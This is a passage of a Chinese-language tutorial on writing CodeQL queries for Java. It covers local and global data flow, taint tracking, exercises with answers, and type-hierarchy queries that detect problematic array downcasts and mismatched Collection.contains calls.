<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor fileReader, <span class="keyword">Call</span> <span class="keyword">call</span></span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) <span class="keyword">and</span></span><br><span class="line">  call.getCallee() <span class="operator">=</span> fileReader</span><br><span class="line"><span class="keyword">select</span> call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/predicate.Member$Member$getDeclaringType.0.html">Member::getDeclaringType</a>：<code>RefType getDeclaringType()</code>，获取定义此成员的类型</p>
</blockquote>
<p>但这只给出参数中的表达式，而不是可以传递给它的值。所以我们使用局部数据流来查找流入参数的所有表达式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor fileReader, <span class="keyword">Call</span> <span class="keyword">call</span>, Expr src</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) <span class="keyword">and</span></span><br><span class="line">  call.getCallee() <span class="operator">=</span> fileReader <span class="keyword">and</span></span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(<span class="number">0</span>)))</span><br><span class="line"><span class="keyword">select</span> src</span><br></pre></td></tr></table></figure>

<p>然后我们可以使源更加具体，例如对一个公共参数的访问。此查询查找将公共参数传递给<code>new FileReader(..)</code>的位置：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor fileReader, <span class="keyword">Call</span> <span class="keyword">call</span>, <span class="keyword">Parameter</span> p</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) <span class="keyword">and</span></span><br><span class="line">  call.getCallee() <span class="operator">=</span> fileReader <span class="keyword">and</span></span><br><span class="line">  DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(call.getArgument(<span class="number">0</span>)))</span><br><span class="line"><span class="keyword">select</span> p</span><br></pre></td></tr></table></figure>



<p>此查询查找对格式字符串没有硬编码的格式化函数的调用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.StringFormat</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> StringFormatMethod format, MethodAccess <span class="keyword">call</span>, Expr formatString</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  call.getMethod() <span class="operator">=</span> format <span class="keyword">and</span></span><br><span class="line">  call.getArgument(format.getFormatStringIndex()) <span class="operator">=</span> formatString <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">not</span> <span class="keyword">exists</span>(DataFlow::Node source, DataFlow::Node sink <span class="operator">|</span></span><br><span class="line">    DataFlow::localFlow(source, sink) <span class="keyword">and</span></span><br><span class="line">    source.asExpr() instanceof StringLiteral <span class="keyword">and</span></span><br><span class="line">    sink.asExpr() <span class="operator">=</span> formatString</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">call</span>, &quot;Argument to String format method isn&#x27;t hard-coded.&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/docs/ql-language-reference/formulas/#exists">exists</a>：<code>exists(&lt;variable declarations&gt; | &lt;formula&gt;)</code>。还可以写作<code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code>，相当于 <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; and &lt;formula 2&gt;)</code>。这个函数引入了一些新的变量，如果变量至少有一组值可以使主体中的公式为真，则该函数成立。例如， <code>exists(int i | i instanceof OneTwoThree)</code> 引入<code>int</code>类型的临时变量<code>i</code>，如果<code>i</code>的任何值是<code>OneTwoThree</code>类型，则函数成立</p>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$StringLiteral.html">StringLiteral</a>：<code>Class StringLiteral</code>，字符串文本或文本块（Java 15特性）</p>
</blockquote>
<h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><p>练习1：使用局部数据流编写一个查询，查找所有用于创建 <code>java.net.URL</code>的硬编码字符串（<a href="./#%E7%BB%83%E4%B9%A01">答案</a>）</p>
<h4 id="全局数据流"><a href="#全局数据流" class="headerlink" title="全局数据流"></a>全局数据流</h4><p>全局数据流跟踪整个程序中的数据流，因此比局部数据流更强大。然而，全局数据流不如局部数据流精确，分析通常需要大量时间和内存</p>
<h5 id="使用全局数据流"><a href="#使用全局数据流" class="headerlink" title="使用全局数据流"></a>使用全局数据流</h5><p>可以通过扩展类 <code>DataFlow::Configuration</code>来使用全局数据流库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class MyDataFlowConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  MyDataFlowConfiguration() &#123; this <span class="operator">=</span> &quot;MyDataFlowConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这些谓词在配置中定义：</p>
<ul>
<li><code>isSource</code>—定义了数据可能从何而来</li>
<li><code>isSink</code>—定义了数据可能流向的位置</li>
<li><code>isBarrier</code>—可选，限制数据流</li>
<li><code>isAdditionalFlowStep</code>—可选，添加额外的流程步骤</li>
</ul>
<p>特征谓词 <code>MyDataFlowConfiguration()</code> 定义了配置的名称，所以<code>&quot;MyDataFlowConfiguration&quot;</code>应该是唯一的名称，例如你的类名</p>
<p>使用谓词 <code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code>执行数据流分析：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> MyDataFlowConfiguration dataflow, DataFlow::Node source, DataFlow::Node sink</span><br><span class="line"><span class="keyword">where</span> dataflow.hasFlow(source, sink)</span><br><span class="line"><span class="keyword">select</span> source, &quot;Data flow to $@.&quot;, sink, sink.toString()</span><br></pre></td></tr></table></figure>



<h5 id="使用全局污点跟踪"><a href="#使用全局污点跟踪" class="headerlink" title="使用全局污点跟踪"></a>使用全局污点跟踪</h5><p>就像局部污点跟踪是对局部数据流的跟踪一样，全局污点跟踪是对全局数据流的跟踪。也就是说，全局污点跟踪通过额外的非保值步骤扩展了全局数据流。</p>
<p><a href="https://github.com/github/codeql/discussions/8460">Difference between DataFlow::Configuration and TaintTracking::Configuration</a></p>
<p>可以通过扩展类 <code>TaintTracking::Configuration</code>来使用全局污点跟踪库：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123; this <span class="operator">=</span> &quot;MyTaintTrackingConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这些谓词在配置中定义：</p>
<ul>
<li><code>isSource</code>—定义了污点可能来自哪里</li>
<li><code>isSink</code>—定义了污点可能流向哪里</li>
<li><code>isSanitizer</code>—可选，限制污点的流动</li>
<li><code>isAdditionalTaintStep</code>—可选，添加其他污点步骤</li>
</ul>
<p>与全局数据流类似，特征谓词 <code>MyTaintTrackingConfiguration()</code> 定义了配置的唯一名称</p>
<p>污点跟踪分析使用谓词 <code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code></p>
<h5 id="Flow-sources"><a href="#Flow-sources" class="headerlink" title="Flow sources"></a>Flow sources</h5><p>数据流库包含一些预定义的流源。 <code>RemoteFlowSource</code> 类（在<code>semmle.code.java.dataflow.FlowSources</code>）中定义）表示可能由远程用户控制的数据流源，这对于查找安全问题很有用</p>
<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><p>此查询显示使用远程用户输入作为数据源的污点跟踪配置</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123;</span><br><span class="line">    this <span class="operator">=</span> &quot;...&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h5><p>练习2：编写一个查询，使用全局数据流查找用于创建 <code>java.net.URL</code>的所有硬编码字符串（<a href="./#%E7%BB%83%E4%B9%A02">答案</a>）</p>
<p>练习3：编写一个表示来自 <code>java.lang.System.getenv(..)</code>的流源的类（<a href="./#%E7%BB%83%E4%B9%A03">答案</a>）</p>
<p>练习4：使用2和3中的答案，编写一个查询，查找所有从 <code>getenv</code> 到<code>java.net.URL</code>的全局数据流（<a href="./#%E7%BB%83%E4%B9%A04">答案</a>）</p>
<h4 id="练习答案"><a href="#练习答案" class="headerlink" title="练习答案"></a>练习答案</h4><h5 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor url, <span class="keyword">Call</span> <span class="keyword">call</span>, StringLiteral src</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  url.getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;) <span class="keyword">and</span></span><br><span class="line">  call.getCallee() <span class="operator">=</span> url <span class="keyword">and</span></span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(<span class="number">0</span>)))</span><br><span class="line"><span class="keyword">select</span> src</span><br></pre></td></tr></table></figure>

<h5 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class Configuration extends DataFlow::Configuration &#123;</span><br><span class="line">  Configuration() &#123;</span><br><span class="line">    this <span class="operator">=</span> &quot;LiteralToURL Configuration&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr() instanceof StringLiteral</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>) <span class="keyword">and</span></span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> DataFlow::Node src, DataFlow::Node sink, Configuration config</span><br><span class="line"><span class="keyword">where</span> config.hasFlow(src, sink)</span><br><span class="line"><span class="keyword">select</span> src, &quot;This string constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure>

<h5 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class GetenvSource extends MethodAccess &#123;</span><br><span class="line">  GetenvSource() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> m <span class="operator">|</span> m <span class="operator">=</span> this.getMethod() <span class="operator">|</span></span><br><span class="line">      m.hasName(&quot;getenv&quot;) <span class="keyword">and</span></span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class GetenvSource extends DataFlow::ExprNode &#123;</span><br><span class="line">  GetenvSource() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> m <span class="operator">|</span> m <span class="operator">=</span> this.asExpr().(MethodAccess).getMethod() <span class="operator">|</span></span><br><span class="line">      m.hasName(&quot;getenv&quot;) <span class="keyword">and</span></span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetenvToURLConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  GetenvToURLConfiguration() &#123;</span><br><span class="line">    this <span class="operator">=</span> &quot;GetenvToURLConfiguration&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof GetenvSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>) <span class="keyword">and</span></span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> DataFlow::Node src, DataFlow::Node sink, GetenvToURLConfiguration config</span><br><span class="line"><span class="keyword">where</span> config.hasFlow(src, sink)</span><br><span class="line"><span class="keyword">select</span> src, &quot;This environment variable constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure>



<h3 id="Java中的类型"><a href="#Java中的类型" class="headerlink" title="Java中的类型"></a>Java中的类型</h3><p>标准CodeQL库通过<code>Type</code>类及其各种子类来表示Java类型</p>
<p><code>PrimitiveType</code>类表示Java语言中内置的基本类型（如<code>boolean</code>和<code>int</code>），而<code>RefType</code>及其子类表示引用类型，即类、接口、数组类型等。也包括来自Java标准库的类型（如<code>Java.lang.Object</code>）和由非库代码定义的类型</p>
<p><code>RefType</code>类还为类层次结构建模：成员谓词<code>getASupertype</code>和<code>getASubtype</code>可以查找引用类型的直接超类和子类。例如，对于以下Java程序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">I</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">I</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>类<code>A</code>有一个直接超类（<code>java.lang.Object</code>）和一个直接子类（<code>B</code>）；接口<code>I</code>也是如此。而类<code>B</code>有两个直接超类（<code>A</code>和<code>I</code>），没有直接子类</p>
<p>为了确定超类（包括直接超类，以及它们的超类等），我们可以使用传递闭包。例如，要在上面的示例中查找<code>B</code>的所有超类，我们可以使用以下查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Class B</span><br><span class="line"><span class="keyword">where</span> B.hasName(&quot;B&quot;)</span><br><span class="line"><span class="keyword">select</span> B.getASupertype<span class="operator">+</span>()</span><br></pre></td></tr></table></figure>

<p>如果在上面的示例代码段上运行此查询，则查询将返回<code>A</code>、<code>I</code>和<code>java.lang.Object</code></p>
<p>除了类层次结构建模，<code>RefType</code>还提供成员谓词<code>getAMember</code>，用于访问类中声明的成员（即字段、构造函数和方法），以及谓词<code>inherits(Method m)</code>，用于检查类是否声明或继承方法<code>m</code></p>
<h4 id="示例：查找有问题的数组强制转换"><a href="#示例：查找有问题的数组强制转换" class="headerlink" title="示例：查找有问题的数组强制转换"></a>示例：查找有问题的数组强制转换</h4><p>作为如何使用类层次结构API的示例，我们可以编写一个查询来查找数组的向下转型，也就是某种类型<code>A[]</code>转换为类型<code>B[]</code>的表达式<code>e</code>（<code>B</code>是<code>A</code>的（不一定是直接的）子类）</p>
<p>这种类型的转换是有问题的，因为向下转换数组会导致运行时异常，即使每个数组元素都可以向下转换。例如，以下代码会引发<code>ClassCastException</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] o = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;world&quot;</span> &#125;;</span><br><span class="line">String[] s = (String[])o;</span><br></pre></td></tr></table></figure>

<p>另一方面，如果表达式<code>e</code>恰好计算为<code>B[]</code>数组，则转换将成功：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] o = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;world&quot;</span> &#125;;</span><br><span class="line">String[] s = (String[])o;</span><br></pre></td></tr></table></figure>

<p>在本文中，我们不尝试区分这两种情况。 我们的查询应该只是简单地查找从<code>source</code>类转换为<code>target</code>类的转换表达式<code>ce</code>：</p>
<ul>
<li><code>source</code>和<code>target</code>都是数组类型</li>
<li><code>source</code>的元素类型是<code>target</code>元素类型的可传递超类</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> CastExpr ce, <span class="keyword">Array</span> source, <span class="keyword">Array</span> target</span><br><span class="line"><span class="keyword">where</span> source <span class="operator">=</span> ce.getExpr().getType() <span class="keyword">and</span></span><br><span class="line">    target <span class="operator">=</span> ce.getType() <span class="keyword">and</span></span><br><span class="line">    target.getElementType().(RefType).getASupertype<span class="operator">+</span>() <span class="operator">=</span> source.getElementType()</span><br><span class="line"><span class="keyword">select</span> ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure>

<p>请注意，通过将<code>target.getElementType()</code> 转换为<code>RefType</code>，我们排除了所有元素类型为原始类型的情况，即 <code>target</code>是原始类型的数组：在这种情况下不会出现我们正在寻找的问题。 与 Java 不同，QL 中的强制转换永远不会失败：如果无法将表达式强制转换为所需的类型，它会简单地从查询结果中排除，这也正是我们想要的</p>
<h5 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h5><p>在版本5之前的旧Java代码上运行此查询，通常会返回由于使用将集合转换为<code>T[]</code>类型的数组的方法<code>Collection.toArray(T[])</code>而产生的许多误报结果</p>
<p>在不使用泛型的代码中，这个方法通常如下使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"><span class="comment">// add some elements of type A to l</span></span><br><span class="line">A[] as = (A[])l.toArray(<span class="keyword">new</span> <span class="title class_">A</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>这段代码中，<code>l</code>是原始类型<code>List</code>，所以<code>l.toArray</code>返回<code>Object[]</code>类型，与它的参数数组的类型无关。因此从<code>Object[]</code>转到<code>A[]</code>会被我们的查询标记为有问题，尽管在运行时，这个转换永远不会出错</p>
<p>为了识别这些情况，我们可以创建两个CodeQL类分别用来表示<code>Collection.toArray</code>方法和此方法或任何重写它的方法的调用：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** class representing java.util.Collection.toArray(T[]) */</span></span><br><span class="line">class CollectionToArray extends <span class="keyword">Method</span> &#123;</span><br><span class="line">    CollectionToArray() &#123;</span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;) <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;toArray&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** class representing calls to java.util.Collection.toArray(T[]) */</span></span><br><span class="line">class CollectionToArrayCall extends MethodAccess &#123;</span><br><span class="line">    CollectionToArrayCall() &#123;</span><br><span class="line">        <span class="keyword">exists</span>(CollectionToArray m <span class="operator">|</span></span><br><span class="line">            this.getMethod().getSourceDeclaration().overridesOrInstantiates<span class="operator">*</span>(m)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** the call&#x27;s actual return type, as determined from its argument */</span></span><br><span class="line">    <span class="keyword">Array</span> getActualReturnType() &#123;</span><br><span class="line">        <span class="keyword">result</span> <span class="operator">=</span> this.getArgument(<span class="number">0</span>).getType()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意在<code>CollectionToArrayCall</code>的构造函数中使用了<code>getSourceDeclaration</code>和<code>overridesOrInstantiates</code>：我们希望找到对<code>Collection.toArray</code>方法和任何重写它的方法的调用，以及这些方法的任何参数化实例。例如，在上面的示例中，<code>l.toArray</code>解析为原始类型<code>ArrayList</code>中的<code>toArray</code>方法。其源声明是位于泛型类<code>ArrayList&lt;T&gt;</code>中的<code>toArray</code>，该类重写<code>AbstractCollection&lt;T&gt;.toArray</code>，这反过来会覆盖<code>Collection&lt;T&gt;.toArray</code>，它是<code>Collection.toArray</code>的一个实例化。（因为重写方法中的类型参数<code>T</code>属于<code>ArrayList</code>，并且是属于<code>Collection</code>的类型参数的实例）</p>
<p>使用这些新类，我们可以扩展查询，排除误报：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="keyword">Insert</span> the class definitions <span class="keyword">from</span> above</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> CastExpr ce, <span class="keyword">Array</span> source, <span class="keyword">Array</span> target</span><br><span class="line"><span class="keyword">where</span> source <span class="operator">=</span> ce.getExpr().getType() <span class="keyword">and</span></span><br><span class="line">    target <span class="operator">=</span> ce.getType() <span class="keyword">and</span></span><br><span class="line">    target.getElementType().(RefType).getASupertype<span class="operator">+</span>() <span class="operator">=</span> source.getElementType() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> ce.getExpr().(CollectionToArrayCall).getActualReturnType() <span class="operator">=</span> target</span><br><span class="line"><span class="keyword">select</span> ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure>



<h4 id="示例：查找不匹配的contains"><a href="#示例：查找不匹配的contains" class="headerlink" title="示例：查找不匹配的contains"></a>示例：查找不匹配的contains</h4><p>我们现在将编写一个查询来查找查询元素的类型与集合的元素类型无关的<code>Collection.contains</code>的使用</p>
<p>例如，<a href="https://zookeeper.apache.org/">Apache Zookeeper</a>以前在类<code>QuorumPeerConfig</code>中有一段类似于以下内容的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; zkProp;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zkProp.entrySet().contains(<span class="string">&quot;dynamicConfigFile&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>zkProp</code>是从<code>Object</code>到<code>Object</code>的映射，因此<code>zkProp.entrySet</code>返回一个<code>Set&lt;Entry&lt;Object, Object&gt;&gt;</code>类型的集合。 这样的集合不可能包含<code>String</code>类型的元素（代码已被修复为使用<code>zkProp.containsKey</code>）</p>
<p>一般来说，我们希望找到对<code>Collection.contains</code>的调用（或任何<code>Collection</code>的参数化实例中的重写了它方法），而且集合元素的类型<code>E</code>和<code>contains</code>参数的类型<code>A</code>是不相关的，也就是说，它们没有共同的子类</p>
<p>首先创建一个描述<code>java.util.Collection</code>的类：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class JavaUtilCollection extends GenericInterface &#123;</span><br><span class="line">    JavaUtilCollection() &#123;</span><br><span class="line">        this.hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了确保没有错误，可以运行一个简单的测试查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> JavaUtilCollection juc</span><br><span class="line"><span class="keyword">select</span> juc</span><br></pre></td></tr></table></figure>

<p>这个查询应该只返回一个结果</p>
<p>然后创建一个描述<code>java.util.Collection.contains</code>的类：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class JavaUtilCollectionContains extends <span class="keyword">Method</span> &#123;</span><br><span class="line">    JavaUtilCollectionContains() &#123;</span><br><span class="line">        this.getDeclaringType() instanceof JavaUtilCollection <span class="keyword">and</span></span><br><span class="line">        this.hasStringSignature(&quot;contains(Object)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了<code>hasStringSignature</code>来检查以下项：</p>
<ul>
<li><p>该方法的名称为<code>contains</code></p>
</li>
<li><p>它只有一个参数</p>
</li>
<li><p>参数的类型是<code>Object</code></p>
</li>
</ul>
<p>或者可以使用<code>hasName</code>，<code>getNumberOfParameters</code>，<code>getParameter(0).getType() instanceof TypeObject</code>来分别实现这三项</p>
<p>现在我们要识别对<code>Collection.contains</code>的所有调用，包括任何重写它的方法，并考虑<code>Collection</code>的所有参数化实例以及其子类，编写如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class JavaUtilCollectionContainsCall extends MethodAccess &#123;</span><br><span class="line">    JavaUtilCollectionContainsCall() &#123;</span><br><span class="line">        <span class="keyword">exists</span>(JavaUtilCollectionContains jucc <span class="operator">|</span></span><br><span class="line">            this.getMethod().getSourceDeclaration().overrides<span class="operator">*</span>(jucc)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于每次调用<code>contains</code>，我们关注的是参数的类型以及调用它的集合的元素类型。 所以我们需要在类<code>JavaUtilCollectionContainsCall</code>中添加<code>getArgumentType</code>和<code>getCollectionElementType</code>这两个成员谓词</p>
<p>前者很简单：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Type getArgumentType() &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> this.getArgument(<span class="number">0</span>).getType()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于后者，我们将按以下步骤进行：</p>
<ul>
<li>找到被调用的<code>contains</code>方法的声明类型<code>D</code></li>
<li>找到<code>D</code>的超类<code>S</code>（或者<code>D</code>本身），且是<code>java.util.Collection</code>的参数化实例</li>
<li>返回<code>S</code>的类型参数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Type getCollectionElementType() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(RefType D, ParameterizedInterface S <span class="operator">|</span></span><br><span class="line">        D <span class="operator">=</span> this.getMethod().getDeclaringType() <span class="keyword">and</span></span><br><span class="line">        D.hasSupertype<span class="operator">*</span>(S) <span class="keyword">and</span> S.getSourceDeclaration() instanceof JavaUtilCollection <span class="keyword">and</span></span><br><span class="line">        <span class="keyword">result</span> <span class="operator">=</span> S.getTypeArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将这两个成员谓词添加到<code>JavaUtilCollectionContainsCall</code>中，我们还需要编写一个谓词来检查两个给定的引用类型是否具有公共子类：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">predicate haveCommonDescendant(RefType tp1, RefType tp2) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(RefType commondesc <span class="operator">|</span> commondesc.hasSupertype<span class="operator">*</span>(tp1) <span class="keyword">and</span> commondesc.hasSupertype<span class="operator">*</span>(tp2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

